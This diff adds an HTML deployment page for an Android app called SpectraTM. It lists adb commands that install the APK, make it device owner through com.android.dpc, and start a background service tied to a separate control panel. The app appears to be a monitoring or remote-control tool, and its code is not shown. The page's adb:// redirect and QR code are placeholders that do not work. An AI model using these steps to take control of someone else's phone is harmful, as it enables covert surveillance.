@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpectraTM - Quick Deploy</title>
+    <style>
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: monospace;
+            text-align: center;
+            padding: 2rem;
+            margin: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: rgba(0, 50, 0, 0.2);
+            border: 1px solid #0f0;
+            border-radius: 10px;
+            padding: 2rem;
+        }
+        .logo {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            text-shadow: 0 0 20px #0f0;
+        }
+        .apk-link {
+            display: block;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            color: #0f0;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+        .apk-link:hover {
+            background: rgba(0, 255, 0, 0.2);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+        }
+        .instructions {
+            text-align: left;
+            background: rgba(0, 30, 0, 0.5);
+            padding: 1rem;
+            border-radius: 5px;
+            margin-top: 2rem;
+            font-size: 0.9rem;
+        }
+        .command {
+            background: #111;
+            padding: 0.5rem;
+            border-left: 3px solid #0f0;
+            margin: 0.5rem 0;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🔍 SPECTRATM</div>
+        <p>Quick Deployment Package</p>
+        
+        <a href="spectratm.apk" class="apk-link" id="apkLink">
+            📱 Download SpectraTM APK
+        </a>
+        
+        <div class="instructions">
+            <h3>📋 Installation Steps:</h3>
+            <div class="command">adb install spectratm.apk</div>
+            <div class="command">adb shell dpm set-device-owner com.android.dpc/.DeviceAdminReceiver</div>
+            <div class="command">adb shell am startservice com.android.dpc/.CoreService</div>
+            
+            <p style="margin-top: 1rem;">
+                <strong>Server:</strong> Run <code>npm start</code> in control folder<br>
+                <strong>Panel:</strong> http://localhost:8000
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Auto-redirect to ADB protocol handler if available
+        document.getElementById('apkLink').addEventListener('click', function(e) {
+            const userAgent = navigator.userAgent.toLowerCase();
+            
+            // Try ADB protocol handler for development machines
+            if (!userAgent.includes('mobile')) {
+                try {
+                    // Custom protocol handler for local ADB
+                    setTimeout(() => {
+                        window.location.href = 'adb://push?file=spectratm.apk';
+                    }, 100);
+                } catch (err) {
+                    // Protocol not supported, continue with normal download
+                }
+            }
+        });
+
+        // QR Code generation for mobile devices
+        if (navigator.userAgent.toLowerCase().includes('mobile')) {
+            const qrContainer = document.createElement('div');
+            qrContainer.innerHTML = `
+                <p style="margin-top: 2rem;">📱 On mobile? Scan QR code on desktop:</p>
+                <div style="background: white; padding: 1rem; border-radius: 10px; margin: 1rem 0;">
+                    <canvas id="qrcode" width="200" height="200"></canvas>
+                </div>
+            `;
+            document.querySelector('.container').appendChild(qrContainer);
+
+            // Simple QR code generation (placeholder - use real QR library in production)
+            const canvas = document.getElementById('qrcode');
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = '#000';
+            ctx.fillRect(0, 0, 200, 200);
+            ctx.fillStyle = '#fff';
+            ctx.font = '12px monospace';
+            ctx.fillText(window.location.href, 10, 100);
+        }
+
+        // Auto-refresh every 30 seconds to check for updates
+        setInterval(() => {
+            fetch('/health')
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Server status:', data.status);
+                })
+                .catch(() => {
+                    console.log('Server offline');
+                });
+        }, 30000);
+
+        // Show deployment status
+        const statusDiv = document.createElement('div');
+        statusDiv.style.cssText = `
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: rgba(0, 50, 0, 0.9);
+            border: 1px solid #0f0;
+            padding: 0.5rem;
+            border-radius: 5px;
+            font-size: 0.8rem;
+        `;
+        statusDiv.textContent = '🟢 Ready for deployment';
+        document.body.appendChild(statusDiv);
+    </script>
+</body>
+</html>
